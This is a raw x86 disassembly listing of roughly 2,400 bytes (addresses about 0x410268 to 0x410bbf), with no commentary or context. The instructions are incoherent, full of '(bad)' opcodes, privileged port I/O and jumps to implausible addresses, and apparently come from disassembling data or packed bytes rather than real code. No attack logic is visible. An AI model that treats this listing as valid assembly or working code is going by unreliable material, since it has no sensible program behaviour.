  410268:	mov    WORD PTR ds:0xedcd6830,ss
  41026e:	loope  0x41026a
	...
  410284:	repz sub al,0xa
  410287:	(bad)  
  410288:	fyl2x  
  41028a:	popa   
  41028b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41028c:	(bad)  
  41028d:	out    0x7b,al
  41028f:	or     cl,BYTE PTR [ecx+ebp*2-0x1e]
  410293:	dec    edi
  410294:	vmread DWORD PTR [eax+0x3],esi
  410298:	mov    ecx,0x1b2f7b9e
  41029d:	mov    al,0x74
  41029f:	and    BYTE PTR [ecx-0x73ff873b],0xed
  4102a6:	jecxz  0x4102ae
  4102a8:	dec    ebx
  4102a9:	mov    eax,0xed8df374
  4102ae:	or     ebx,ebp
  4102b0:	dec    esi
  4102b1:	cs out 0xf7,al
  4102b4:	fs mov cl,0xe4
  4102b7:	inc    eax
  4102b8:	mov    WORD PTR [eax-0x4b],?
  4102bb:	jecxz  0x4102f9
  4102bd:	adc    eax,0xed8c32e6
  4102c2:	mov    bl,al
  4102c4:	mov    BYTE PTR [ebx+0x19498d0c],al
  4102ca:	frstor [edi-0x39]
  4102cd:	(bad)  
  4102ce:	leave  
  4102cf:	inc    edx
  4102d1:	out    0xd,eax
  4102d3:	call   0xfebe2631
  4102d8:	xchg   DWORD PTR [ebp-0x2ac3ec08],ebp
  4102de:	or     al,BYTE PTR [eax]
  4102e0:	mov    bl,0xe
  4102e2:	(bad)  
  4102e4:	and    ebp,esp
  4102e6:	popa   
  4102e7:	add    BYTE PTR ds:[eax],al
	...
  4102fa:	add    BYTE PTR [eax],al
  4102fc:	and    DWORD PTR [esi+0x2eb9e77b],ebx
  410302:	jge    0x410302
  410304:	add    DWORD PTR [ecx],0x72
  410307:	cmp    cl,0x94
  41030a:	daa    
  41030b:	add    al,0xf9
  41030d:	sbb    al,0x18
  41030f:	adc    eax,0x4b1eddd3
  410314:	dec    ebp
  410315:	(bad)  
  410316:	(bad)  
  410318:	push   es
  410319:	icebp  
  41031a:	bound  eax,QWORD PTR [eax+0x57]
  41031d:	imul   ebx,edi,0xffffffe9
  410320:	rcr    ch,cl
  410322:	je     0x41032f
  410324:	xor    al,0x54
  410326:	stos   DWORD PTR es:[edi],eax
  410327:	je     0x410363
  410329:	or     al,0x25
  41032b:	js     0x4102d8
  41032d:	jnp    0x410386
  41032f:	ret    
  410330:	sub    ebx,edi
  410332:	adc    al,0x51
  410334:	retf   
  410335:	push   ebx
  410336:	fbstp  TBYTE PTR [eax+eiz*4-0x74]
  41033a:	xlat   BYTE PTR ds:[ebx]
  41033b:	jae    0x410354
  41033d:	fidiv  WORD PTR [esi+0x206ca4eb]
  410343:	add    al,0x74
  410345:	xchg   edx,eax
  410346:	fild   WORD PTR [ebx]
  410348:	or     al,0xde
  41034a:	adc    al,0xc
  41034c:	in     al,0xbe
  41034e:	xchg   ebx,eax
  41034f:	je     0x41033b
  410351:	fst    st(4)
  410353:	push   eax
  410354:	dec    ebx
  410355:	push   ebx
  410356:	fbstp  TBYTE PTR [eax+eiz*2-0x74]
  41035a:	xchg   edi,eax
  41035b:	sub    dl,bl
  41035d:	fnsave [esi-0x15]
	...
  410374:	lea    edx,[edi+ebx*8-0x18983d7d]
  41037b:	imul   edx,DWORD PTR [edi-0x4d8b9123],0x67
  410382:	push   ebx
  410383:	je     0x4103a5
  410385:	mov    WORD PTR [edi+0x3a],es
  410388:	dec    eax
  410389:	fld    QWORD PTR [esi+0x4a]
  41038c:	int    0x98
  41038e:	(bad)  
  410390:	push   es
  410391:	icebp  
  410392:	bound  edi,QWORD PTR [edi]
  410394:	addr16 inc esi
  410396:	or     BYTE PTR [esi-0x5ea0228b],bl
  41039c:	add    BYTE PTR [ecx+0x0],ch
  41039f:	adc    esp,edx
  4103a1:	push   edx
  4103a2:	cmc    
  4103a3:	push   ds
  4103a4:	push   ss
  4103a5:	pop    eax
  4103a6:	hlt    
  4103a7:	push   0xffffff9a
  4103a9:	and    eax,DWORD PTR [edx-0x58]
  4103ac:	(bad)  
  4103ad:	xchg   esp,eax
  4103ae:	add    eax,0x894ca6d
  4103b3:	jmp    0xa2fca3c4
  4103b8:	dec    esi
  4103b9:	(bad)  
  4103bb:	fidivr WORD PTR [ebx-0x7016f7e3]
  4103c1:	adc    DWORD PTR [esp+ebx*4],esi
  4103c4:	jmp    0x410419
  4103c6:	or     cl,ch
  4103c8:	mov    ds,WORD PTR [eax]
  4103ca:	mov    edx,0x89948fe8
  4103cf:	add    al,0x1d
  4103d1:	dec    edx
  4103d2:	inc    edi
  4103d3:	jmp    0x8fcd9167
	...
  4103ec:	mov    DWORD PTR [eax+ecx*1+0x4213bd6a],edx
  4103f3:	sub    BYTE PTR [eax+0x19650594],cl
  4103f9:	xchg   esp,eax
  4103fa:	or     cl,ch
  4103fc:	or     ah,BYTE PTR [eax-0x232edd75]
  410402:	cmc    
  410403:	test   BYTE PTR [ebx],0x9
  410406:	or     cl,ch
  410408:	(bad)  
  410409:	adc    DWORD PTR [eax+eiz*2],esi
  41040c:	add    edx,DWORD PTR [eax+ecx*1-0x17]
  410410:	mov    ds,WORD PTR [eax]
  410412:	jbe    0x4103fc
  410414:	(bad)  
  410415:	xchg   esp,eax
  410416:	mov    DWORD PTR [ecx+edi*8],ebx
  410419:	dec    ecx
  41041a:	inc    edi
  41041b:	jmp    0xdbcd91af
  410420:	nop
  410421:	xchg   esp,eax
  410422:	or     BYTE PTR [eax],al
  410424:	mov    ebp,0x75416dff
  410429:	mov    edx,0x2160fef5
  41042e:	inc    ebx
  41042f:	inc    ecx
  410430:	gs pop ecx
  410432:	dec    esp
  410433:	clc    
  410434:	out    0xe5,al
  410436:	std    
  410437:	add    BYTE PTR [edx+0x14],bh
  41043a:	pop    esi
  41043b:	add    DWORD PTR [ebp-0x68],esi
  41043e:	and    esi,esi
  410440:	and    esp,DWORD PTR [edi+0x7c]
  410443:	clc    
  410444:	mov    bh,BYTE PTR [ebp-0x45]
  410447:	dec    ebx
  410448:	hlt    
  410449:	xchg   edi,eax
  41044a:	xor    eax,0x57c5e2e
	...
  410464:	mov    WORD PTR [esi+0x5b250007],ds
  41046a:	pop    ebx
  41046b:	or     al,0x9e
  41046d:	sbb    DWORD PTR [esi-0x75],ebp
  410470:	mov    edi,0x414d80f4
  410475:	fcomi  st,st(6)
  410477:	pop    fs
  410479:	test   BYTE PTR [edi],al
  41047b:	add    ch,dh
  41047d:	cmp    BYTE PTR [ebx],al
  41047f:	add    ebp,esi
  410481:	xchg   edi,eax
  410482:	pusha  
  410483:	lods   al,BYTE PTR ds:[esi]
  410484:	dec    ebp
  410485:	shl    ebp,1
  410487:	(bad)  
  410488:	sar    BYTE PTR [edi],cl
  41048a:	cmp    esi,DWORD PTR [ecx]
  41048c:	cmc    
  41048d:	xchg   edi,eax
  41048e:	add    eax,eax
  410490:	jmp    0x8997:0xe500fa0c
  410497:	jg     0x410476
  410499:	xchg   edi,eax
  41049a:	add    eax,0x8981f84
  41049f:	add    BYTE PTR [edx],bh
  4104a1:	fimul  WORD PTR ds:0xf6cd0ae8
  4104a7:	(bad)  
  4104a8:	cmp    al,0xcc
  4104aa:	in     eax,0xff
  4104ac:	ret    0xf6df
  4104af:	jne    0x41043d
  4104b1:	cmp    eax,0x5588767a
  4104b6:	add    BYTE PTR [esi-0x6d],al
  4104b9:	push   edx
  4104ba:	shl    DWORD PTR [ebp-0xf5d30c],1
  4104c0:	stc    
  4104c1:	popf   
  4104c2:	push   ecx
  4104c3:	std    
  4104c4:	mov    esp,0xb09ed
	...
  4104d9:	add    BYTE PTR [eax],al
  4104db:	add    BYTE PTR [edx+eiz*8-0x80],cl
  4104df:	mov    bl,0x8c
  4104e1:	in     eax,dx
  4104e2:	or     DWORD PTR [edx-0x74],ebp
  4104e5:	jo     0x4104a7
  4104e7:	out    0xbc,eax
  4104e9:	cmp    al,al
  4104eb:	jmp    0x4104a9
  4104ed:	pop    es
  4104ee:	or     ch,BYTE PTR [edx-0x74]
  4104f1:	add    edi,DWORD PTR [ebx+0x14]
  4104f4:	add    DWORD PTR [esi],esi
  4104f6:	int    0xff
  4104f8:	xchg   BYTE PTR [ebp-0x12e47bf6],ch
  4104fe:	or     DWORD PTR [eax],eax
  410500:	sbb    DWORD PTR [eax+0x38234f60],esi
  410506:	push   esp
  410507:	(bad)  
  410508:	mov    eax,ds:0x91147819
  41050d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050e:	leave  
  41050f:	call   DWORD PTR [esi+0x1177f12d]
  410515:	test   al,0x6c
  410517:	dec    edi
  410518:	in     ax,dx
  41051a:	sar    edi,cl
  41051c:	gs jmp 0xfe60:0x7feaffd3
  410524:	jns    0x410592
  410526:	mov    bl,0x40
  410528:	mov    esi,?
  41052a:	dec    ecx
  41052b:	jae    0x410567
  41052d:	adc    bh,dh
  41052f:	fbstp  TBYTE PTR [ecx+edx*4+0x73c3fecd]
  410536:	int    0xdb
  410538:	or     DWORD PTR [eax-0x6c4cb094],esi
  41053e:	aam    0x4f
	...
  410554:	xor    eax,0x3608d994
  410559:	xchg   esp,eax
  41055a:	pop    esi
  41055b:	imul   DWORD PTR [edi+0x4682fcda]
  410561:	push   ebp
  410562:	(bad)  
  410564:	dec    ebx
  410565:	popa   
  410566:	sbb    ah,bl
  410568:	sbb    edx,0x4e
  41056b:	mov    dl,0x7a
  41056d:	pusha  
  41056e:	out    0x5b,eax
  410570:	pop    edx
  410571:	push   esp
  410572:	cs jno 0x4105df
  410575:	arpl   di,si
  410577:	jo     0x410552
  410579:	nop
  41057a:	push   ds
  41057b:	not    DWORD PTR [ebx+0x52c306ec]
  410581:	fimul  DWORD PTR [esi]
  410583:	imul   DWORD PTR [ebx-0x26]
  410586:	jl     0x4105d7
  410588:	inc    edx
  410589:	pusha  
  41058a:	out    0x5b,eax
  41058c:	cmp    al,0x54
  41058e:	out    0x70,al
  410590:	xor    ah,BYTE PTR [eax-0x35]
  410593:	pop    ebx
  410594:	lea    ecx,[edi-0x2a]
  410597:	jo     0x4105bb
  410599:	pusha  
  41059a:	ret    
  41059b:	jo     0x41051d
  41059d:	(bad)  
  41059f:	ret    
  4105a0:	adc    ebp,DWORD PTR [edi+ebx*8+0x70]
  4105a4:	sub    al,0xb6
  4105a7:	push   ss
  4105a8:	adc    eax,0xfb04204e
  4105ad:	pop    edi
  4105ae:	scas   eax,DWORD PTR es:[edi]
  4105af:	pop    ebx
  4105b0:	jmp    0xeb1b405
  4105b5:	shr    bh,cl
  4105b7:	jo     0x4105b9
	...
  4105c9:	add    BYTE PTR [eax],al
  4105cb:	add    BYTE PTR [eax-0x20],dl
  4105ce:	(bad)  
  4105cf:	out    dx,al
  4105d0:	fist   WORD PTR [esi+edx*8-0x7125147a]
  4105d7:	jo     0x41058d
  4105d9:	pop    ds
  4105da:	jbe    0x41064c
  4105dc:	ret    0x86e
  4105df:	jmp    0x6f316620
  4105e4:	call   0x7bd9:0x8fa8421b
  4105eb:	pop    ebp
  4105ec:	sbb    al,0x60
  4105ee:	add    BYTE PTR [ecx+0x66],al
  4105f1:	push   esi
  4105f2:	cmc    
  4105f3:	dec    esi
  4105f4:	mov    esp,0x932bbf37
  4105f9:	xchg   esp,eax
  4105fa:	pop    ebx
  4105fb:	jb     0x4105e0
  4105fd:	adc    al,0xcd
  4105ff:	adc    eax,0x5cf5daf4
  410604:	dec    edx
  410605:	fstp   QWORD PTR [eax+0x26]
  410608:	bound  ecx,QWORD PTR [ebp+0x51b8d4f5]
  41060e:	inc    edi
  41060f:	jmp    0xe979d3cb
  410614:	(bad)  
  410615:	(bad)  
  410616:	enter  0x12f6,0x2a
  41061a:	or     cl,ch
  41061c:	(bad)  
  41061d:	ror    DWORD PTR [ebx-0xf],1
  410620:	mov    ss,WORD PTR [eax+ecx*1-0x3af3b17]
  410627:	out    0x93,al
  410629:	xchg   esp,eax
  41062a:	or     BYTE PTR [ebx-0x78],dl
  41062d:	outs   dx,BYTE PTR ds:[esi]
  41062e:	or     BYTE PTR [ebx+0x0],al
	...
  410641:	add    BYTE PTR [eax],al
  410643:	add    BYTE PTR [eax+0x455c086e],dl
  410649:	in     eax,0x58
  41064b:	je     0x410662
  41064d:	in     eax,0xfd
  41064f:	mov    esi,0x3cf54973
  410654:	push   0x50ad7bda
  410659:	idiv   DWORD PTR [eax]
  41065b:	jmp    0x160993ef
  410660:	xchg   ebp,eax
  410661:	jmp    0x4106dd
  410663:	call   0x3ea19af7
  410668:	adc    BYTE PTR [eax+ecx*1+0x0],dl
  41066c:	adc    bl,bl
  41066e:	add    eax,ebp
  410670:	adc    dl,cl
  410672:	idiv   bh
  410674:	xchg   ebp,eax
  410675:	pop    ebp
  410676:	lds    ecx,FWORD PTR [ebp-0x1a3d8]
  41067c:	xor    al,al
  41067e:	push   edi
  41067f:	call   0x37d7e6
  410684:	sub    al,0xb
  410686:	shl    bh,cl
  410688:	inc    edx
  410689:	imul   ebp,ebp,0xf6673935
  41068f:	push   0x75
  410691:	mov    esp,0x942468e7
  410696:	cmc    
  410697:	mov    ch,0x81
  410699:	pop    edi
  41069a:	idiv   bh
  41069c:	mov    dl,0x9d
  41069e:	(bad)  [eax+0x34]
  4106a1:	xchg   esp,eax
  4106a2:	loopne 0x4106d9
  4106a4:	sub    ah,BYTE PTR [edi-0xa]
  4106a7:	mov    DWORD PTR [eax],eax
	...
  4106b9:	add    BYTE PTR [eax],al
  4106bb:	add    al,ch
  4106bd:	pusha  
  4106be:	(bad)  
  4106bf:	call   DWORD PTR [edx-0x75980a46]
  4106c5:	mov    eax,0x1d420048
  4106ca:	shl    bh,cl
  4106cc:	and    ah,BYTE PTR [edi-0xa]
  4106cf:	xor    eax,0x491be6
  4106d4:	cmp    eax,0x42ff4d7f
  4106d9:	pop    ecx
  4106da:	mov    esp,gs
  4106dc:	cmp    ah,BYTE PTR [edi-0xa]
  4106df:	push   0xfffffff5
  4106e1:	mov    ebx,0x90b468e1
  4106e6:	cmc    
  4106e7:	mov    ch,0x21
  4106e9:	pop    edi
  4106ea:	idiv   bh
  4106ec:	and    bl,BYTE PTR [ebp-0x6f4bb727]
  4106f2:	loopne 0x4106ed
  4106f4:	stos   DWORD PTR es:[edi],eax
  4106f5:	test   BYTE PTR [bx+di+0x688c],0x51
  4106fb:	not    bl
  4106fd:	push   es
  4106fe:	sar    bh,1
  410700:	xor    ebx,DWORD PTR [ecx+edx*8+0x40]
  410704:	mov    WORD PTR [esi-0x50],ss
  410707:	fcmovnb st,st(3)
  410709:	pop    esi
  41070a:	data16 (bad) 
  41070c:	jns    0x410708
  41070e:	mov    cl,0x40
  410710:	mov    WORD PTR [ebp+0x42],es
  410713:	inc    ebp
  410714:	mov    ds:0xb0847436,eax
  410719:	ss data16 (bad) 
  41071c:	es in  eax,dx
  41071e:	shl    ebp,1
	...
  410734:	hlt    
  410735:	sub    al,0xa
  410737:	(bad)  
  410738:	cmp    DWORD PTR [ecx+0x7e],edi
  41073b:	(bad)  
  41073c:	jnp    0x4106dc
  41073e:	xor    bl,dl
  410740:	les    ebp,FWORD PTR [edx+ecx*1]
  410743:	call   0xfea82e71
  410748:	adc    eax,0x5bf66970
  41074d:	jle    0x4106d9
  41074f:	mov    esp,0xfe667e60
  410754:	mov    WORD PTR [ecx-0x26],ds
  410757:	addr16 mov ebp,gs
  41075a:	push   esi
  41075b:	mov    ebp,0xe7f1583b
  410760:	jbe    0x41078f
  410762:	addr16 (bad) 
  410764:	sub    edi,eax
  410766:	jl     0x41075e
  410768:	and    esi,DWORD PTR [esi-0x2a7b8b9d]
  41076e:	jbe    0x4107af
  410770:	adc    eax,esi
  410772:	arpl   WORD PTR [eax+edi*8+0x3fe6415],si
  410779:	mov    al,ds:0xad0ce7f4
  41077e:	arpl   si,di
  410780:	repz pop edi
  410782:	push   esp
  410783:	imul   bl
  410785:	xchg   ebx,eax
  410786:	scas   al,BYTE PTR es:[edi]
  410787:	ins    DWORD PTR es:[edi],dx
  410788:	pop    eax
  410789:	mov    WORD PTR [edi-0x6128640e],ss
  41078f:	ins    DWORD PTR es:[edi],dx
  410790:	sbb    al,dh
  410792:	sahf   
  410793:	ins    DWORD PTR es:[edi],dx
  410794:	retf   0xf4d6
  410797:	sti    
	...
  4107ac:	stos   DWORD PTR es:[edi],eax
  4107ad:	outs   dx,DWORD PTR ds:[esi]
  4107ae:	pop    ds
  4107af:	ins    DWORD PTR es:[edi],dx
  4107b0:	mov    edx,0xba6434d6
  4107b5:	(bad)  
  4107b6:	ins    WORD PTR es:[edi],dx
  4107b8:	and    BYTE PTR [edi+edx*2+0x56d763d6],cl
  4107bf:	ins    DWORD PTR es:[edi],dx
  4107c0:	loopne 0x410779
  4107c2:	push   esi
  4107c3:	ins    DWORD PTR es:[edi],dx
  4107c4:	xchg   edx,eax
  4107c5:	(bad)  
  4107c6:	fdiv   st(3),st
  4107c8:	jae    0x4107df
  4107ca:	dec    esi
  4107cb:	ins    DWORD PTR es:[edi],dx
  4107cc:	adc    dh,0x7c
  4107cf:	push   eax
  4107d0:	adc    dh,0x3e
  4107d3:	pop    esp
  4107d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107d5:	push   ecx
  4107d6:	es ins DWORD PTR es:[edi],dx
  4107d8:	push   0x20
  4107da:	adc    BYTE PTR [ebp+0x62],dh
  4107dd:	(bad)  
  4107de:	pop    ss
  4107df:	or     eax,0x6d1ed5cf
  4107e4:	sbb    cl,ch
  4107e6:	push   ds
  4107e7:	ins    DWORD PTR es:[edi],dx
  4107e8:	dec    edx
  4107e9:	in     eax,dx
  4107ea:	rol    eax,cl
  4107ec:	inc    edx
  4107ed:	(bad)  
  4107ee:	div    BYTE PTR [esi+0x6cfede33]
  4107f4:	sub    ecx,DWORD PTR [edx+eiz*4-0x6b29d594]
  4107fb:	addr16 sbb dl,dh
  4107fe:	(bad)  
  4107ff:	pop    ebx
  410800:	sbb    DWORD PTR [ebx-0x22],edx
  410803:	ins    BYTE PTR es:[edi],dx
  410804:	adc    ah,BYTE PTR [eax]
  410806:	shl    BYTE PTR [edx+ecx*1-0x2a],0xd7
  41080b:	jo     0x41085a
  41080d:	aad    0xb6
  41080f:	ins    BYTE PTR es:[edi],dx
	...
  410824:	push   eax
  410825:	fmul   QWORD PTR [eax]
  410827:	shr    bh,0xd7
  41082a:	cmc    
  41082b:	scas   al,BYTE PTR es:[edi]
  41082c:	js     0x41088e
  41082e:	hlt    
  41082f:	xchg   ecx,eax
  410830:	loopne 0x4107d8
  410832:	or     cl,ch
  410834:	xchg   esi,eax
  410835:	rol    DWORD PTR [eax],cl
  410837:	jmp    0x6b2612f6
  41083c:	push   ebx
  41083d:	fldenv [edx-0x17]
  410840:	in     eax,0x4c
  410842:	cmc    
  410843:	hlt    
  410844:	mov    bh,0xed
  410846:	or     ebp,DWORD PTR [ecx]
  410848:	and    esi,edx
  41084a:	jg     0x410870
  41084c:	sbb    al,0x6d
  41084e:	leave  
  41084f:	ror    esi,1
  410851:	aad    0xf6
  410853:	aam    0x97
  410855:	in     eax,dx
  410856:	add    BYTE PTR [edi+0x20],dl
  410859:	(bad)  
  41085a:	cmc    
  41085b:	aam    0xfb
  41085d:	(bad)  
  41085e:	jnp    0x410851
  410860:	out    0xa5,eax
  410862:	dec    eax
  410863:	ds call 0x902ed335
  410869:	aas    
  41086a:	cmp    DWORD PTR ds:0x26fcd10c,0x97e0895a
  410874:	jp     0x41080a
  410876:	or     dl,ah
  410878:	iret   
  410879:	pusha  
  41087a:	or     al,0x20
  41087c:	int    0x89
  41087e:	or     BYTE PTR [esi],al
  410880:	cmp    al,BYTE PTR [ebp-0x6b657820]
  410886:	or     dl,ah
	...
  41089c:	iret   
  41089d:	pusha  
  41089e:	or     al,0x20
  4108a0:	int    0x89
  4108a2:	or     BYTE PTR [eax+0x4d],dh
  4108a5:	(bad)  
  4108a7:	push   esp
  4108a8:	test   al,0xed
  4108aa:	pushf  
  4108ab:	sub    esp,DWORD PTR [edi+0x74247fd6]
  4108b1:	(bad)  
  4108b2:	jnp    0x4108b4
  4108b4:	leave  
  4108b5:	push   0xe33af87c
  4108ba:	add    eax,0xf71a09e8
  4108bf:	(bad)  
  4108c0:	out    dx,al
  4108c1:	push   eax
  4108c2:	jns    0x4108ff
  4108c4:	pop    esp
  4108c5:	sar    ecx,cl
  4108c7:	push   0xffffffe5
  4108c9:	pop    ebx
  4108ca:	dec    esp
  4108cb:	hlt    
  4108cc:	xchg   ebp,eax
  4108cd:	imul   edi,DWORD PTR [esp+edi*8+0xd],0xaff6244
  4108d5:	aad    0xb5
  4108d7:	je     0x4108ac
  4108d9:	mov    eax,0x2a0a0ff5
  4108de:	div    DWORD PTR [ebp-0x53]
  4108e1:	cmp    dh,bh
  4108e3:	sub    ch,BYTE PTR ds:[ecx-0xa]
  4108e7:	jne    0x410892
  4108e9:	imul   edi,DWORD PTR [eax+ecx*1+0x4d],0xdaff371a
  4108f1:	aas    
  4108f2:	jl     0x4108e8
  4108f4:	retf   0xf1c5
  4108f7:	inc    DWORD PTR [eax-0x30]
  4108fa:	in     eax,dx
  4108fb:	adc    al,0x7a
  4108fd:	aas    
  4108fe:	idiv   bh
	...
  410914:	and    BYTE PTR [ebp*8-0x9c0c8db],bh
  41091b:	leave  
  41091c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091d:	int3   
  41091e:	cmc    
  41091f:	push   esp
  410920:	out    dx,al
  410921:	ins    BYTE PTR es:[edi],dx
  410922:	mov    al,ah
  410924:	and    esi,0x703975f6
  41092a:	out    0x46,al
  41092c:	cmp    bh,BYTE PTR [edi]
  41092e:	add    al,al
  410930:	mov    al,0x94
  410932:	push   esi
  410933:	leave  
  410934:	ja     0x410902
  410936:	cmc    
  410937:	mov    WORD PTR [eax+0x48],?
  41093a:	inc    ebp
  41093b:	inc    eax
  41093d:	int3   
  41093e:	in     eax,dx
  41093f:	mov    eax,ds:0xfe61828c
  410944:	xchg   edi,eax
  410945:	std    
  410946:	repnz sub esp,0xffffffbd
  41094a:	or     DWORD PTR [eax],eax
  41094c:	sti    
  41094d:	mov    BYTE PTR [eax-0x19],ah
  410950:	mov    BYTE PTR [edi+0x61],bh
  410953:	(bad)  
  410954:	adc    eax,0x59fe5079
  410959:	stc    
  41095a:	bound  esi,QWORD PTR [eax+ebp*8+0x32]
  41095e:	stc    
  41095f:	mul    esp
  410961:	xlat   BYTE PTR ds:[ebx]
  410962:	retf   
  410963:	dec    bl
  410965:	ss clc 
  410967:	jmp    0x41091e
  410969:	pop    esi
  41096a:	or     DWORD PTR [eax],eax
  41096c:	mov    WORD PTR [ebp-0x42b296fe],fs
  410972:	xlat   BYTE PTR ds:[ebx]
  410973:	out    0x5b,eax
  410975:	adc    ecx,DWORD PTR [edx]
	...
  41098b:	add    BYTE PTR [edi-0x5afb0783],dl
  410991:	adc    eax,0x368c000a
  410996:	jns    0x4109ff
  410998:	stos   BYTE PTR es:[edi],al
  410999:	aam    0xcc
  41099b:	jmp    FWORD PTR [ebx+0x47]
  41099e:	sbb    eax,0x79be8c00
  4109a3:	mov    cl,bh
  4109a5:	push   ebp
  4109a6:	shr    DWORD PTR ds:0x5609fcf5,1
  4109ac:	je     0x410995
  4109ae:	str    WORD PTR [esi+eax*8-0x69718bb7]
  4109b6:	test   DWORD PTR [ecx-0x1d27ca64],0x67560015
  4109c0:	jl     0x4109e6
  4109c2:	int    0xff
  4109c4:	fst    DWORD PTR [ebp-0x4273d1e4]
  4109ca:	idiv   BYTE PTR [edi+0x5ce19499]
  4109d0:	mov    eax,0x63dcd01f
  4109d5:	cmp    eax,0x62f40420
  4109da:	repz add ecx,DWORD PTR [edi+edx*4-0xf7f8451]
  4109e2:	push   edi
  4109e3:	sbb    ah,BYTE PTR [ebp+0x55]
  4109e6:	(bad)  
  4109e8:	repz ret 0x3f4
  4109ec:	mov    WORD PTR [edi+0xef9f],ds
	...
  410a02:	add    BYTE PTR [eax],al
  410a04:	lea    edi,[edi+0x1c837dea]
  410a0a:	xor    eax,0xb7591451
  410a0f:	jge    0x410a59
  410a11:	mov    eax,0x1f8c04a5
  410a16:	sub    eax,0xdf93c94c
  410a1b:	push   0xef66f020
  410a20:	stos   DWORD PTR es:[edi],eax
  410a21:	rcl    ah,cl
  410a23:	sti    
  410a24:	mov    bl,0x26
  410a26:	push   esi
  410a27:	imul   edx,DWORD PTR [edx+0x1664b51d],0x937c4b58
  410a31:	push   ds
  410a32:	xchg   ebp,eax
  410a33:	push   eax
  410a34:	push   es
  410a35:	pop    eax
  410a36:	daa    
  410a37:	jl     0x4109bc
  410a39:	adc    al,0xfe
  410a3b:	add    ebx,DWORD PTR [ebx+0x62689c17]
  410a41:	shr    BYTE PTR [esi],cl
  410a43:	out    dx,eax
  410a44:	addr16 mov ebp,0xd252c2bf
  410a4a:	ins    BYTE PTR es:[edi],dx
  410a4b:	mov    edi,0xb907653b
  410a50:	retf   0xed1
  410a53:	pop    ebp
  410a54:	cmp    esi,DWORD PTR [eax+0x38]
  410a57:	inc    esi
  410a58:	xchg   DWORD PTR [eax+ecx*1-0xa425764],edx
  410a5f:	je     0x410a7c
  410a61:	mov    edx,0xd2a52c53
  410a66:	add    DWORD PTR [ecx+0x0],ebp
	...
  410a7c:	and    edi,DWORD PTR [ebp+0x60]
  410a7f:	call   0x39495f6a
  410a84:	pusha  
  410a85:	mov    esp,0x6164c64c
  410a8a:	pusha  
  410a8b:	ds pop esi
  410a8d:	xchg   ecx,eax
  410a8e:	or     BYTE PTR [ecx-0x70],al
  410a91:	xchg   esp,eax
  410a92:	in     eax,0x6f
  410a94:	(bad)  
  410a95:	mov    ds:0x6490285f,eax
  410a9a:	cmc    
  410a9b:	adc    al,0xd0
  410a9d:	mov    ecx,0xd235012c
  410aa2:	loopne 0x410a55
  410aa4:	iret   
  410aa5:	shl    ch,cl
  410aa7:	mov    al,0x51
  410aa9:	cdq    
  410aaa:	or     BYTE PTR [ecx+esi*1],dl
  410aad:	mov    ebp,0x3b33ad89
  410ab2:	or     BYTE PTR [ebx],al
  410ab4:	loop   0x410a88
  410ab6:	jnp    0x410aa9
  410ab8:	aaa    
  410ab9:	retf   
  410aba:	xor    ebx,DWORD PTR [esi+0x24]
  410abd:	sbb    al,0x4c
  410abf:	push   ebp
  410ac0:	imul   ebp,DWORD PTR [ebx-0x46782b0b],0xd2e446ab
  410aca:	bound  ecx,QWORD PTR [edx]
  410acc:	in     eax,0x48
  410ace:	add    BYTE PTR [ecx+0x18],al
  410ad1:	shl    ch,cl
  410ad3:	cs inc ecx
  410ad5:	lods   eax,DWORD PTR ds:[esi]
  410ad6:	cmc    
  410ad7:	pushf  
  410ad8:	push   edi
  410ad9:	mov    ecx,0xd2e41e97
  410ade:	pusha  
  410adf:	jmp    0x410ae4
	...
  410af4:	pop    ecx
  410af6:	mov    dh,0x81
  410af8:	cmp    edi,DWORD PTR [edi+eax*2]
  410afb:	add    BYTE PTR ds:0xe46908ed,ah
  410b01:	xchg   esp,eax
  410b02:	cmc    
  410b03:	jne    0x410b32
  410b05:	ins    DWORD PTR es:[edi],dx
  410b06:	into   
  410b07:	imul   esi,DWORD PTR [edx],0x3175f639
  410b0d:	cmp    DWORD PTR [eax+ecx*1+0x3d],edi
  410b11:	cmp    esi,DWORD PTR [edi+edi*8]
  410b14:	loop   0x410aa4
  410b16:	mov    DWORD PTR [esi*8+0x64ec82e3],0x32f7dd54
  410b21:	cmp    DWORD PTR [ebp+eax*2+0x75f6e821],eax
  410b28:	sar    DWORD PTR [ecx],0x7c
  410b2b:	or     ch,bh
  410b2d:	and    ah,BYTE PTR [edx]
  410b2f:	add    ch,ah
  410b31:	int    0xb5
  410b33:	(bad)  
  410b36:	or     BYTE PTR [eax],al
  410b38:	mov    ch,0x91
  410b3a:	dec    esp
  410b3b:	clc    
  410b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3d:	xchg   esp,eax
  410b3e:	or     BYTE PTR [eax],al
  410b40:	jmp    0x894:0xbafff9d2
  410b47:	push   0xffffffb5
  410b49:	jmp    0x8cf5:0xeaa569f5
  410b50:	call   0xf8ce5095
  410b55:	inc    esp
  410b56:	(bad)  
  410b57:	inc    DWORD PTR [eax]
	...
  410b69:	add    BYTE PTR [eax],al
  410b6b:	add    dl,dl
  410b6d:	call   0x380e8168
  410b72:	jl     0x410b70
  410b74:	fucomp st(7)
  410b76:	and    DWORD PTR [eax],eax
  410b78:	jne    0x410b45
  410b7a:	mov    ch,0x74
  410b7c:	push   0x65018a71
  410b81:	xchg   esp,eax
  410b82:	pusha  
  410b83:	scas   eax,DWORD PTR es:[edi]
  410b84:	sbb    eax,0x8cfef5d9
  410b89:	xor    dh,bh
  410b8b:	out    0x4,eax
  410b8d:	sti    
  410b8e:	outs   dx,BYTE PTR ds:[esi]
  410b8f:	(bad)  
  410b90:	fadd   QWORD PTR [edx+0x5c]
  410b93:	mov    WORD PTR [ecx],cs
  410b95:	retf   0xfe66
  410b98:	sub    ebp,DWORD PTR [esi]
  410b9a:	fsub   st,st(7)
  410b9c:	hlt    
  410b9d:	cli    
  410b9e:	outs   dx,BYTE PTR ds:[esi]
  410b9f:	inc    BYTE PTR ds:0x13f64141
  410ba5:	out    dx,eax
  410ba6:	push   ecx
  410ba7:	std    
  410ba8:	retf   
  410ba9:	out    0x6e,al
  410bab:	imul   ecx,DWORD PTR [ebp+edx*2-0x42b29740],0x6d4b46e
  410bb6:	outs   dx,DWORD PTR ds:[esi]
  410bb7:	(bad)  
  410bb8:	jmp    0x410b4a
  410bba:	hlt    
  410bbb:	out    0x8d,eax
  410bbd:	jp     0x410c2c
  410bbf:	inc    BYTE PTR ds:0xd3f67941
